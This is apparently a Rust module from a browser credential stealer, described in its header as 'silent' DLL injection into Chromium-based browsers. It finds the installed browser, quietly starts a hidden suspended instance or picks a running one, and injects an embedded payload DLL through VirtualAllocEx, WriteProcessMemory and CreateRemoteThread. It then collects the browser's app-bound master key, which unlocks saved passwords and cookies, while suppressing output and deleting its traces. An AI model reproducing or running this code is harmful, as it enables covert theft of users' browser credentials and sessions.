//! Silent in-process Chromium DLL injection (no external chrome-recovery.exe).

mod browsers;

use std::{
    env,
    ffi::OsStr,
    fs,
    mem,
    os::windows::ffi::OsStrExt,
    path::{Path, PathBuf},
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use serde_json::Value;
use winreg::enums::HKEY_LOCAL_MACHINE;
use winreg::RegKey;
use windows::{
    core::{PCSTR, PCWSTR, PWSTR},
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        Storage::FileSystem::{
            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_WRITE, OPEN_EXISTING,
        },
        System::{
            Diagnostics::{
                Debug::WriteProcessMemory,
                ToolHelp::{
                    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
                    TH32CS_SNAPPROCESS,
                },
            },
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::{VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE},
            Threading::{
                CreateProcessW, CreateRemoteThread, GetExitCodeThread, OpenProcess,
                QueryFullProcessImageNameW, ResumeThread, TerminateProcess, WaitForSingleObject,
                INFINITE, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, PROCESS_NAME_WIN32,
                PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE,
                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, STARTUPINFOW,
                STARTUPINFOW_FLAGS,
            },
        },
    },
};

const RESULT_ENV: &str = "CHROME_RECOVERY_RESULT";
const USER_DATA_ENV: &str = "CHROME_RECOVERY_USER_DATA_REL";
const DATA_ROOT_ENV: &str = "CHROME_RECOVERY_DATA_ROOT";
const BROWSER_NAME_ENV: &str = "CHROME_RECOVERY_BROWSER_NAME";

fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

fn session_tag() -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:x}{:x}", std::process::id(), nanos)
}

struct Cleanup {
    files: Vec<PathBuf>,
    dirs: Vec<PathBuf>,
    spawned_pid: Option<u32>,
}

impl Cleanup {
    fn new() -> Self {
        Self {
            files: Vec::new(),
            dirs: Vec::new(),
            spawned_pid: None,
        }
    }

    fn track_file(&mut self, path: PathBuf) {
        self.files.push(path);
    }

    fn track_dir(&mut self, path: PathBuf) {
        self.dirs.push(path);
    }
}

impl Drop for Cleanup {
    fn drop(&mut self) {
        if let Some(pid) = self.spawned_pid.take() {
            unsafe {
                if let Ok(proc) = OpenProcess(PROCESS_TERMINATE, false, pid) {
                    TerminateProcess(proc, 0).ok();
                    CloseHandle(proc).ok();
                }
            }
        }
        for path in &self.files {
            let _ = fs::remove_file(path);
        }
        for path in &self.dirs {
            let _ = fs::remove_dir_all(path);
        }
        let _ = env::remove_var(RESULT_ENV);
        let _ = env::remove_var(USER_DATA_ENV);
        let _ = env::remove_var(DATA_ROOT_ENV);
        let _ = env::remove_var(BROWSER_NAME_ENV);
    }
}

fn find_browser_pids(target_exe: &str) -> Vec<u32> {
    let mut pids = Vec::new();
    unsafe {
        let snap = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(s) => s,
            Err(_) => return pids,
        };
        let mut entry = PROCESSENTRY32W {
            dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };
        if Process32FirstW(snap, &mut entry).is_ok() {
            loop {
                let name: String = entry
                    .szExeFile
                    .iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                    .collect();
                if name.eq_ignore_ascii_case(target_exe) {
                    pids.push(entry.th32ProcessID);
                }
                if Process32NextW(snap, &mut entry).is_err() {
                    break;
                }
            }
        }
        CloseHandle(snap).ok();
    }
    pids
}

fn get_process_exe_path(pid: u32) -> Option<String> {
    unsafe {
        let proc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid).ok()?;
        let mut buf = vec![0u16; 1024];
        let mut size = buf.len() as u32;
        QueryFullProcessImageNameW(proc, PROCESS_NAME_WIN32, PWSTR(buf.as_mut_ptr()), &mut size)
            .ok()?;
        CloseHandle(proc).ok();
        Some(String::from_utf16_lossy(&buf[..size as usize]))
    }
}

fn get_browser_exe_from_registry(exe_name: &str) -> Option<PathBuf> {
    let key_path = format!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\{exe_name}");
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(key) = hklm.open_subkey(&key_path) {
        if let Ok(path) = key.get_value::<String, _>("") {
            let p = PathBuf::from(path);
            if p.exists() {
                return Some(p);
            }
        }
    }
    None
}

fn push_path(candidates: &mut Vec<PathBuf>, path: PathBuf) {
    candidates.push(path);
}

fn find_browser_exe_on_disk(target_exe: &str, browser_name: &str) -> Option<String> {
    let pf = env::var("ProgramFiles").unwrap_or_default();
    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
    let local = env::var("LOCALAPPDATA").unwrap_or_default();

    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(p) = get_browser_exe_from_registry(target_exe) {
        candidates.push(p);
    }

    match target_exe {
        "chrome.exe" => match browser_name {
            "Chrome Beta" => {
                push_path(&mut candidates, PathBuf::from(&local).join("Google\\Chrome Beta\\Application\\chrome.exe"));
                push_path(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome Beta\\Application\\chrome.exe"));
            }
            "Chrome Dev" => {
                push_path(&mut candidates, PathBuf::from(&local).join("Google\\Chrome Dev\\Application\\chrome.exe"));
                push_path(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome Dev\\Application\\chrome.exe"));
            }
            "Chrome Canary" => {
                push_path(&mut candidates, PathBuf::from(&local).join("Google\\Chrome SxS\\Application\\chrome.exe"));
                push_path(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome SxS\\Application\\chrome.exe"));
            }
            "Chromium" => {
                push_path(&mut candidates, PathBuf::from(&pf).join("Chromium\\Application\\chrome.exe"));
                push_path(&mut candidates, PathBuf::from(&local).join("Chromium\\Application\\chrome.exe"));
            }
            "CentBrowser" => {
                push_path(&mut candidates, PathBuf::from(&local).join("CentBrowser\\Application\\chrome.exe"));
                push_path(&mut candidates, PathBuf::from(&pf).join("CentBrowser\\Application\\chrome.exe"));
            }
            _ => {
                push_path(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe"));
                push_path(&mut candidates, PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe"));
                push_path(&mut candidates, PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe"));
            }
        },
        "msedge.exe" => match browser_name {
            "Edge Beta" => {
                push_path(&mut candidates, PathBuf::from(&pf).join("Microsoft\\Edge Beta\\Application\\msedge.exe"));
                push_path(&mut candidates, PathBuf::from(&local).join("Microsoft\\Edge Beta\\Application\\msedge.exe"));
            }
            "Edge Dev" => {
                push_path(&mut candidates, PathBuf::from(&pf).join("Microsoft\\Edge Dev\\Application\\msedge.exe"));
                push_path(&mut candidates, PathBuf::from(&local).join("Microsoft\\Edge Dev\\Application\\msedge.exe"));
            }
            _ => {
                push_path(&mut candidates, PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe"));
                push_path(&mut candidates, PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe"));
                push_path(&mut candidates, PathBuf::from(&local).join("Microsoft\\Edge\\Application\\msedge.exe"));
            }
        },
        "brave.exe" => match browser_name {
            "Brave Beta" => {
                push_path(&mut candidates, PathBuf::from(&local).join("BraveSoftware\\Brave-Browser-Beta\\Application\\brave.exe"));
                push_path(&mut candidates, PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser-Beta\\Application\\brave.exe"));
            }
            "Brave Nightly" => {
                push_path(&mut candidates, PathBuf::from(&local).join("BraveSoftware\\Brave-Browser-Nightly\\Application\\brave.exe"));
                push_path(&mut candidates, PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser-Nightly\\Application\\brave.exe"));
            }
            _ => {
                push_path(&mut candidates, PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
                push_path(&mut candidates, PathBuf::from(&pf86).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
                push_path(&mut candidates, PathBuf::from(&local).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
            }
        },
        "vivaldi.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("Vivaldi\\Application\\vivaldi.exe"));
            push_path(&mut candidates, PathBuf::from(&pf).join("Vivaldi\\Application\\vivaldi.exe"));
        }
        "opera.exe" => match browser_name {
            "OperaGX" => {
                push_path(&mut candidates, PathBuf::from(&local).join("Programs\\Opera GX\\opera.exe"));
                push_path(&mut candidates, PathBuf::from(&pf).join("Opera GX\\opera.exe"));
            }
            "Opera Neon" => {
                push_path(&mut candidates, PathBuf::from(&local).join("Programs\\Opera Neon\\opera.exe"));
            }
            _ => {
                push_path(&mut candidates, PathBuf::from(&local).join("Programs\\Opera\\opera.exe"));
                push_path(&mut candidates, PathBuf::from(&pf).join("Opera\\opera.exe"));
            }
        },
        "browser.exe" => match browser_name {
            "CocCoc" => {
                push_path(&mut candidates, PathBuf::from(&local).join("CocCoc\\Browser\\Application\\browser.exe"));
                push_path(&mut candidates, PathBuf::from(&pf).join("CocCoc\\Browser\\Application\\browser.exe"));
            }
            _ => {
                push_path(&mut candidates, PathBuf::from(&local).join("Yandex\\YandexBrowser\\Application\\browser.exe"));
                push_path(&mut candidates, PathBuf::from(&pf).join("Yandex\\YandexBrowser\\Application\\browser.exe"));
            }
        },
        "360chrome.exe" => {
            push_path(&mut candidates, PathBuf::from(&pf).join("360Chrome\\Chrome\\Application\\360chrome.exe"));
            push_path(&mut candidates, PathBuf::from(&local).join("360Chrome\\Chrome\\Application\\360chrome.exe"));
        }
        "epic.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("Epic Privacy Browser\\Application\\epic.exe"));
        }
        "uran.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("uCozMedia\\Uran\\Application\\uran.exe"));
        }
        "7star.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("7Star\\7Star\\Application\\7star.exe"));
        }
        "torch.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("Torch\\Application\\torch.exe"));
        }
        "kometa.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("Kometa\\Application\\kometa.exe"));
        }
        "orbitum.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("Orbitum\\Application\\orbitum.exe"));
        }
        "amigo.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("Amigo\\Application\\amigo.exe"));
        }
        "sputnik.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("Sputnik\\Sputnik\\Application\\sputnik.exe"));
        }
        "slimjet.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("Slimjet\\Application\\slimjet.exe"));
            push_path(&mut candidates, PathBuf::from(&pf).join("Slimjet\\slimjet.exe"));
        }
        "iridium.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("Iridium\\Application\\iridium.exe"));
        }
        "thorium.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("Thorium\\Application\\thorium.exe"));
        }
        "Arc.exe" => {
            push_path(&mut candidates, PathBuf::from(&local).join("The Browser Company\\Arc\\Application\\Arc.exe"));
        }
        _ => {}
    }

    for path in candidates {
        if path.exists() {
            return Some(path.to_string_lossy().into_owned());
        }
    }
    None
}

fn resolve_browser_exe(target_exe: &str, browser_name: &str) -> Option<String> {
    find_browser_pids(target_exe)
        .iter()
        .find_map(|&pid| get_process_exe_path(pid))
        .or_else(|| find_browser_exe_on_disk(target_exe, browser_name))
}

fn inject_dll(pid: u32, dll_path: &Path) -> Result<(), ()> {
    let dll_str = dll_path.to_string_lossy();
    let dll_wide = wide(&dll_str);
    let dll_bytes = dll_wide.len() * 2;

    unsafe {
        let proc = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
            false,
            pid,
        )
        .map_err(|_| ())?;

        let remote = VirtualAllocEx(proc, None, dll_bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if remote.is_null() {
            CloseHandle(proc).ok();
            return Err(());
        }

        let mut written = 0usize;
        if WriteProcessMemory(
            proc,
            remote,
            dll_wide.as_ptr() as *const _,
            dll_bytes,
            Some(&mut written),
        )
        .is_err()
        {
            let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
            CloseHandle(proc).ok();
            return Err(());
        }

        let k32 = GetModuleHandleW(windows::core::w!("kernel32.dll")).map_err(|_| ())?;
        let loadlib = GetProcAddress(k32, PCSTR(b"LoadLibraryW\0".as_ptr())).ok_or(())?;
        let start_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 = mem::transmute(loadlib);

        let thr = CreateRemoteThread(proc, None, 0, Some(start_fn), Some(remote), 0, None)
            .map_err(|_| {
                let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
                let _ = CloseHandle(proc);
            })?;

        WaitForSingleObject(thr, INFINITE);
        let mut exit_code = 0u32;
        GetExitCodeThread(thr, &mut exit_code).ok();
        CloseHandle(thr).ok();
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE).ok();
        CloseHandle(proc).ok();

        if exit_code == 0 {
            return Err(());
        }
    }
    Ok(())
}

fn spawn_suspended_and_inject(
    chrome_exe: &str,
    dll_path: &Path,
    profile_dir: &Path,
) -> Result<u32, ()> {
    let profile_str = profile_dir.to_string_lossy();
    let cmdline = format!(
        "\"{chrome_exe}\" --headless=new --disable-gpu \
         --disable-logging --log-level=3 --silent-debug-dump \
         --disable-background-networking --disable-sync --disable-default-apps \
         --disable-features=PushMessaging,NotificationTriggers \
         --remote-debugging-port=0 --no-first-run \
         --no-default-browser-check --noerrdialogs \
         --user-data-dir=\"{profile_str}\""
    );

    let exe_w = wide(chrome_exe);
    let mut cmd_w = wide(&cmdline);

    let mut si = STARTUPINFOW {
        cb: mem::size_of::<STARTUPINFOW>() as u32,
        dwFlags: STARTUPINFOW_FLAGS(0x0000_0100),
        ..Default::default()
    };
    let mut pi = PROCESS_INFORMATION::default();
    const CREATE_FLAGS: u32 = 0x0000_0004 | 0x0800_0000;

    unsafe {
        let nul = CreateFileW(
            windows::core::w!("NUL"),
            FILE_GENERIC_WRITE.0,
            FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE::default(),
        )
        .map_err(|_| ())?;

        si.hStdInput = nul;
        si.hStdOutput = nul;
        si.hStdError = nul;

        CreateProcessW(
            PCWSTR(exe_w.as_ptr()),
            PWSTR(cmd_w.as_mut_ptr()),
            None,
            None,
            true,
            PROCESS_CREATION_FLAGS(CREATE_FLAGS),
            None,
            None,
            &si,
            &mut pi,
        )
        .map_err(|_| {
            let _ = CloseHandle(nul);
        })?;

        CloseHandle(nul).ok();
        let pid = pi.dwProcessId;

        match inject_dll(pid, dll_path) {
            Ok(()) => {
                ResumeThread(pi.hThread);
                CloseHandle(pi.hThread).ok();
                CloseHandle(pi.hProcess).ok();
                Ok(pid)
            }
            Err(()) => {
                TerminateProcess(pi.hProcess, 1).ok();
                CloseHandle(pi.hThread).ok();
                CloseHandle(pi.hProcess).ok();
                Err(())
            }
        }
    }
}

fn hex_to_key(hex: &str) -> Option<Vec<u8>> {
    if hex.len() != 64 {
        return None;
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}

fn read_key_from_result(path: &Path) -> Option<Vec<u8>> {
    let raw = fs::read_to_string(path).ok()?;
    let json: Value = serde_json::from_str(&raw).ok()?;
    if json.get("error").and_then(|e| e.as_str()).is_some() {
        return None;
    }
    let hex = json.get("master_key_hex")?.as_str()?;
    hex_to_key(hex)
}

/// Extract embedded payload to temp, inject silently, return 32-byte app-bound key.
pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
    if payload_dll.is_empty() {
        return None;
    }

    let target = browsers::find_target(browser_name)?;
    let exe = target.exe;
    let browser_exe = resolve_browser_exe(exe, browser_name)?;

    let tag = session_tag();
    let temp = env::temp_dir();
    let dll_path = temp.join(format!("{tag}.tmp"));
    let result_path = temp.join(format!("{tag}.json"));
    let profile_dir = temp.join(format!("{tag}_p"));

    let mut cleanup = Cleanup::new();
    cleanup.track_file(dll_path.clone());
    cleanup.track_file(result_path.clone());
    cleanup.track_dir(profile_dir.clone());

    fs::write(&dll_path, payload_dll).ok()?;
    env::set_var(RESULT_ENV, &result_path);
    env::set_var(USER_DATA_ENV, target.user_data_rel);
    env::set_var(
        DATA_ROOT_ENV,
        match target.root {
            browsers::DataRoot::Local => "local",
            browsers::DataRoot::Roaming => "roaming",
        },
    );
    env::set_var(BROWSER_NAME_ENV, browser_name);

    let injected = if let Ok(pid) =
        spawn_suspended_and_inject(&browser_exe, &dll_path, &profile_dir)
    {
        cleanup.spawned_pid = Some(pid);
        true
    } else {
        let mut ok = false;
        for pid in find_browser_pids(exe) {
            if inject_dll(pid, &dll_path).is_ok() {
                ok = true;
                break;
            }
        }
        ok
    };

    if !injected {
        return None;
    }

    for i in 0..24 {
        if result_path.exists() {
            if let Some(key) = read_key_from_result(&result_path) {
                if key.len() == 32 {
                    return Some(key);
                }
            }
        }
        let fallback = env::temp_dir().join("chrome_recovery_result.json");
        if fallback.exists() {
            if let Some(key) = read_key_from_result(&fallback) {
                if key.len() == 32 {
                    cleanup.track_file(fallback);
                    return Some(key);
                }
            }
        }
        let delay = if i < 8 { 200 } else { 400 };
        thread::sleep(Duration::from_millis(delay));
    }

    None
}
